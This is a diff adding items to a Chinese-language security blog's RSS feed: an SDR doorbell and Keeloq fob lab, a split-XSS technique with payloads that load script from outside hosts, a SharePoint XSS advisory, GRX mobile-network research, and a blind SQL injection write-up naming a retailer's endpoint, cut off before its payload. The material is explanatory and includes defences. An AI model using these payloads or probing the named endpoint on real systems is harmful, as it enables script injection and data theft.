@@ -7,7 +7,399 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>qife</copyright>
-        <lastBuildDate>Sat, 02 Aug 2025 09:07:14 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Sat, 02 Aug 2025 18:26:56 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>软件定义无线电(SDR)攻防实验：无线门铃与Keeloq钥匙扣攻击实战</title>
+        <link>http://localhost:1313/p/%E8%BD%AF%E4%BB%B6%E5%AE%9A%E4%B9%89%E6%97%A0%E7%BA%BF%E7%94%B5sdr%E6%94%BB%E9%98%B2%E5%AE%9E%E9%AA%8C%E6%97%A0%E7%BA%BF%E9%97%A8%E9%93%83%E4%B8%8Ekeeloq%E9%92%A5%E5%8C%99%E6%89%A3%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/</link>
+        <pubDate>Sat, 02 Aug 2025 18:26:56 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/%E8%BD%AF%E4%BB%B6%E5%AE%9A%E4%B9%89%E6%97%A0%E7%BA%BF%E7%94%B5sdr%E6%94%BB%E9%98%B2%E5%AE%9E%E9%AA%8C%E6%97%A0%E7%BA%BF%E9%97%A8%E9%93%83%E4%B8%8Ekeeloq%E9%92%A5%E5%8C%99%E6%89%A3%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/</guid>
+        <description>&lt;h1 id=&#34;wild-west-hackin-fest-wwhf-sdr-实验室&#34;&gt;Wild West Hackin&amp;rsquo; Fest (WWHF) SDR 实验室
+&lt;/h1&gt;&lt;p&gt;作者：David Fletcher //&lt;/p&gt;
+&lt;p&gt;在WWHF会议期间，许多参会者索要软件定义无线电(SDR)实验的器材清单和源代码以便在家实践。由于需要根据会议期间的观察修改实验文档和代码，直到现在才完成整理。以下是完整的WWHF SDR实验资料，每个实验包含：器材清单、实验指南和实验脚本，下载全部三个文件即可开始实践。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;注&lt;/strong&gt;：器材清单中的产品不代表官方推荐，仅为我们实际使用的设备。&lt;/p&gt;
+&lt;h2 id=&#34;无线门铃攻击实验&#34;&gt;无线门铃攻击实验
+&lt;/h2&gt;&lt;p&gt;本实验演示对无线门铃信号的捕获、分析与合成，通过手动解码和重放攻击展示防重放机制的必要性。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;器材清单&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;(1) 无线门铃 - $16.99&lt;br&gt;
+&lt;a class=&#34;link&#34; href=&#34;https://www.amazon.com/Heath-Zenith-DL-6166-Wireless-Doorbell/dp/B00HDDD9HI&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;亚马逊链接&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;(1) RTL-SDR接收器 - $19.95&lt;br&gt;
+&lt;a class=&#34;link&#34; href=&#34;https://www.amazon.com/NooElec-NESDR-Mini-Compatible-Packages/dp/B009U7WZCA&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;亚马逊链接&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;(1) YardStick One发射器 - $123.95&lt;br&gt;
+&lt;a class=&#34;link&#34; href=&#34;https://www.amazon.com/YARD-Stick-One-Transceiver-Antenna/dp/B06Y1RVHBP&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;亚马逊链接&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;实验文件&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;%e9%93%be%e6%8e%a5&#34; &gt;实验手册&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;%e9%93%be%e6%8e%a5&#34; &gt;攻击脚本&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;keeloq钥匙扣攻击实验&#34;&gt;Keeloq钥匙扣攻击实验
+&lt;/h2&gt;&lt;p&gt;本实验演示汽车钥匙滚动码信号的捕获与分析，揭示滚动码的保护机制及带外接收重放漏洞。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;器材清单&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;(1) 迷你面包板 - $5.69&lt;/li&gt;
+&lt;li&gt;(1) 面包板电源模块 - $5.49&lt;/li&gt;
+&lt;li&gt;(1) 面包板跳线 - $6.29&lt;/li&gt;
+&lt;li&gt;(1) 2.54mm单排排针 - $5.59&lt;/li&gt;
+&lt;li&gt;(2) PiStop交通信号灯 - $7.82&lt;/li&gt;
+&lt;li&gt;(1) Keeloq钥匙套件 - $21.95&lt;/li&gt;
+&lt;li&gt;(1) RTL-SDR接收器 - $19.95&lt;/li&gt;
+&lt;li&gt;(1) YardStick One发射器 - $123.95&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;实验文件&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;%e9%93%be%e6%8e%a5&#34; &gt;接线图&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;%e9%93%be%e6%8e%a5&#34; &gt;实验手册&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;%e9%93%be%e6%8e%a5&#34; &gt;解码脚本&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;想深入学习？Antisyphon提供可自主定价的进阶培训课程，支持直播/点播学习。&lt;/p&gt;&lt;/blockquote&gt;
+</description>
+        </item>
+        <item>
+        <title>分割XSS攻击载荷：突破20字符限制的技巧</title>
+        <link>http://localhost:1313/p/%E5%88%86%E5%89%B2xss%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7%E7%AA%81%E7%A0%B420%E5%AD%97%E7%AC%A6%E9%99%90%E5%88%B6%E7%9A%84%E6%8A%80%E5%B7%A7/</link>
+        <pubDate>Sat, 02 Aug 2025 16:35:35 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/%E5%88%86%E5%89%B2xss%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7%E7%AA%81%E7%A0%B420%E5%AD%97%E7%AC%A6%E9%99%90%E5%88%B6%E7%9A%84%E6%8A%80%E5%B7%A7/</guid>
+        <description>&lt;h1 id=&#34;split-xss---分割xss攻击载荷&#34;&gt;Split XSS - 分割XSS攻击载荷
+&lt;/h1&gt;&lt;h2 id=&#34;突破20字符限制的xss攻击技术&#34;&gt;突破20字符限制的XSS攻击技术
+&lt;/h2&gt;&lt;p&gt;在测试一个编辑表单时，我发现8个输入字段都存在XSS漏洞，但每个字段限制为20个字符。常规XSS攻击无法在如此短的字符限制下完成，于是我开发了以下技术：&lt;/p&gt;
+&lt;h3 id=&#34;基本攻击思路&#34;&gt;基本攻击思路
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;在第一个输入中开启&lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;标签但不闭合：
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#34;&amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;alert(1)/*&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;在后续输入中闭合标签：
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;*/&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;字符分配策略&#34;&gt;字符分配策略
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;第一个字段：用12个字符闭合输入标签并开始脚本标签，剩余8个字符用于有效载荷&lt;/li&gt;
+&lt;li&gt;中间字段：每字段16个有效载荷字符（扣除4个字符用于注释标记）&lt;/li&gt;
+&lt;li&gt;最后字段：9个有效载荷字符（扣除11个字符用于闭合注释和脚本标签）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;实际攻击载荷示例&#34;&gt;实际攻击载荷示例
+&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;gt;&amp;lt;script&amp;gt;/*
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;*/x=document/*
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;*/.createElement(/*
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;*/&amp;#34;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;);x./*
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;*/src=&amp;#34;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//dn.lc/s&amp;#34;;/*
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;sr&#34;&gt;/document.head./&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;sr&#34;&gt;/appendChild(x);/&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;/&amp;lt;/script&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;组合xss技术&#34;&gt;组合XSS技术
+&lt;/h2&gt;&lt;p&gt;当网站将两个输入字段组合显示时，可以：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;在名字字段注入不完整的脚本标签：
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;abc&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;//digi.ninja/script.js&amp;#34;&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;在姓氏字段注入闭合标签：
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;组合后形成完整标签：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;abc&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;//digi.ninja/script.js&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;防御措施&#34;&gt;防御措施
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;正确的输出编码是根本解决方案&lt;/li&gt;
+&lt;li&gt;输入验证可以作为辅助防御层&lt;/li&gt;
+&lt;li&gt;永远不要信任用户提供的内容&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://digi.ninja/labs/split_xss.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;完整测试实验室可在Split XSS Lab获取&lt;/a&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>SharePoint XSS漏洞技术分析与缓解措施</title>
+        <link>http://localhost:1313/p/sharepoint-xss%E6%BC%8F%E6%B4%9E%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD/</link>
+        <pubDate>Sat, 02 Aug 2025 15:40:04 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/sharepoint-xss%E6%BC%8F%E6%B4%9E%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD/</guid>
+        <description>&lt;h1 id=&#34;sharepoint-xss漏洞&#34;&gt;SharePoint XSS漏洞
+&lt;/h1&gt;&lt;p&gt;今天我们发布了安全公告983438，向客户通报SharePoint Server 2007和SharePoint Services 3.0中存在的跨站脚本(XSS)漏洞。以下是该漏洞的详细技术分析。&lt;/p&gt;
+&lt;h2 id=&#34;攻击向量分析&#34;&gt;攻击向量分析
+&lt;/h2&gt;&lt;p&gt;公告指出该漏洞可能导致SharePoint站点内的权限提升(EoP)。需要特别说明的是，这种权限提升并非从普通用户到工作站或服务器环境的管理员用户，而是攻击者可以在用户的SharePoint会话上下文中执行恶意脚本。最可能的攻击场景是：攻击者向已登录SharePoint服务器的用户发送恶意链接，当用户点击该链接时，攻击者嵌入的JavaScript将在点击者的用户上下文中执行。&lt;/p&gt;
+&lt;h2 id=&#34;缓解措施&#34;&gt;缓解措施
+&lt;/h2&gt;&lt;p&gt;SharePoint使用Http-Only cookies进行身份验证。由于HttpOnly cookies无法通过脚本访问，这显著降低了XSS攻击风险。更多信息请参考《使用HTTP-only Cookies缓解跨站脚本攻击》。&lt;/p&gt;
+&lt;p&gt;IE8的XSS过滤器在Internet区域默认启用，能拦截此类XSS攻击，因此IE8用户面临的风险较低。但该过滤器在本地Intranet区域默认禁用，可通过以下UI界面启用：&lt;/p&gt;
+&lt;p&gt;[图片：IE8 XSS过滤器启用界面]&lt;/p&gt;
+&lt;p&gt;管理员也可以通过组策略为任何区域启用或禁用XSS过滤器，详见《组策略与Internet Explorer 8》。&lt;/p&gt;
+&lt;h2 id=&#34;临时解决方案&#34;&gt;临时解决方案
+&lt;/h2&gt;&lt;p&gt;我们建议通过服务器端ACL设置限制help.aspx文件的访问。启用此方案后，您将无法查看SharePoint站点内的帮助内容。实施此缓解措施的用户可访问以下英文帮助内容作为替代：
+&lt;a class=&#34;link&#34; href=&#34;http://office.microsoft.com/en-us/sharepointserver/FX101211721033.aspx&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://office.microsoft.com/en-us/sharepointserver/FX101211721033.aspx&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Jonathan Ness, David Ross和Chengyun Chu，MSRC工程团队
+&lt;em&gt;本文按&amp;quot;原样&amp;quot;提供，不作任何担保，也不授予任何权利。&lt;/em&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>揭秘GRX网络与间谍活动：移动数据安全漏洞分析</title>
+        <link>http://localhost:1313/p/%E6%8F%AD%E7%A7%98grx%E7%BD%91%E7%BB%9C%E4%B8%8E%E9%97%B4%E8%B0%8D%E6%B4%BB%E5%8A%A8%E7%A7%BB%E5%8A%A8%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
+        <pubDate>Sat, 02 Aug 2025 15:02:00 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/%E6%8F%AD%E7%A7%98grx%E7%BD%91%E7%BB%9C%E4%B8%8E%E9%97%B4%E8%B0%8D%E6%B4%BB%E5%8A%A8%E7%A7%BB%E5%8A%A8%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
+        <description>&lt;h3 id=&#34;移动数据网络基础&#34;&gt;移动数据网络基础
+&lt;/h3&gt;&lt;p&gt;在移动数据网络中，设备位置信息至关重要。例如荷兰KPN运营商拥有约5000个基站，每个基站通过小区标识符（CI）和路由区域码（RAC）进行管理。国际移动用户标识（IMSI）、接入点名称（APN）和SIM卡存储的通用集成电路卡（UICC）是网络接入的核心要素。数据包传输需经过服务GPRS支持节点（SGSN）、网关GPRS支持节点（GGSN）等组件，并通过GPRS隧道协议（GTP）建立专用通信隧道（基于UDP的GTPv0/v1/v2协议）。&lt;/p&gt;
+&lt;h3 id=&#34;grx网络的安全价值&#34;&gt;GRX网络的安全价值
+&lt;/h3&gt;&lt;p&gt;当设备漫游时，运营商通过GRX网络将流量路由至归属国网关。研究团队发现：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;数据暴露风险&lt;/strong&gt;：通过自定义脚本剥离GTP头部后，可解析出明文流量（含用户凭证）；&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;位置追踪&lt;/strong&gt;：GTP头部包含MCC（国家代码）、MNC（运营商代码）、LAC（位置区号）等元数据，结合IMEI分析可精确定位设备；&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;网络隔离失效&lt;/strong&gt;：扫描显示GRX网络中存在大量暴露的SMTP/FTP/Telnet服务（含老旧漏洞版本），42K主机中有5.5K可直接从互联网访问。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;渗透测试方法论&#34;&gt;渗透测试方法论
+&lt;/h3&gt;&lt;p&gt;团队采用&amp;quot;杀伤链&amp;quot;模型对GRX网络进行审计：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;BGP路由分析&lt;/strong&gt;：识别4.8K子网（320K IP地址）；&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;大规模扫描&lt;/strong&gt;：使用zmap探测GTP服务（UDP 2152/2123端口）；&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;模拟攻击&lt;/strong&gt;：通过SGSNEMU工具伪造GGSN连接，建立虚假PDP上下文；&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;服务枚举&lt;/strong&gt;：发现运营商DNS服务器多运行老旧BIND版本（存在DoS漏洞）。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;防御建议&#34;&gt;防御建议
+&lt;/h3&gt;&lt;p&gt;运营商应：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;从BGP表中移除GRX前缀&lt;/li&gt;
+&lt;li&gt;实施BGP认证与入口过滤&lt;/li&gt;
+&lt;li&gt;严格限制AS号间的路由前缀交换&lt;/li&gt;
+&lt;li&gt;应用最小权限访问控制列表（仅允许GTP/DNS/ICMP）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;案例关联&lt;/strong&gt;：比利时电信（Belgacom）被黑事件表明，攻击者可能通过社工管理员而非外部漏洞获取GRX访问权限，凸显内部威胁防护的重要性。&lt;/p&gt;&lt;/blockquote&gt;
+</description>
+        </item>
+        <item>
+        <title>HEMA网站盲注SQL注入漏洞技术分析</title>
+        <link>http://localhost:1313/p/hema%E7%BD%91%E7%AB%99%E7%9B%B2%E6%B3%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</link>
+        <pubDate>Sat, 02 Aug 2025 12:04:20 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/hema%E7%BD%91%E7%AB%99%E7%9B%B2%E6%B3%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</guid>
+        <description>&lt;h1 id=&#34;hema网站盲sql注入漏洞分析&#34;&gt;HEMA网站盲SQL注入漏洞分析
+&lt;/h1&gt;&lt;h2 id=&#34;技术背景&#34;&gt;技术背景
+&lt;/h2&gt;&lt;p&gt;现代网站普遍采用数据库存储数据，服务器应用通过SQL查询语句与数据库交互。当存在查询构造缺陷时，攻击者可能通过注入恶意SQL代码获取敏感数据，这类漏洞被称为SQL注入(SQLi)，在漏洞赏金计划中通常属于高危漏洞。&lt;/p&gt;
+&lt;h2 id=&#34;漏洞发现过程&#34;&gt;漏洞发现过程
+&lt;/h2&gt;&lt;p&gt;在HEMA照片项目服务子域fasteditor.hema.com发现可疑API端点：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://fasteditor.hema.com/api/user/&amp;lt;userID&amp;gt;/products?offset=0&amp;amp;limit=8&amp;amp;orderby=id+DESC
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;测试发现orderby参数存在SQL注入特征：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;插入单引号导致返回PDO错误&lt;/li&gt;
+&lt;li&gt;错误信息显示原始SQL片段且未转义&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;漏洞利用技术&#34;&gt;漏洞利用技术
+&lt;/h2&gt;&lt;p&gt;SQLMap工具检测确认存在三种攻击方式：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;布尔盲注&lt;/strong&gt;：通过结果排序差异推断数据&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;堆叠查询&lt;/strong&gt;：追加执行额外SQL语句&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;时间盲注&lt;/strong&gt;：利用SLEEP()函数时序分析&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;手工payload构造&#34;&gt;手工Payload构造
+&lt;/h2&gt;&lt;p&gt;由于防火墙限制，最终采用时间盲注技术构造特殊payload：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
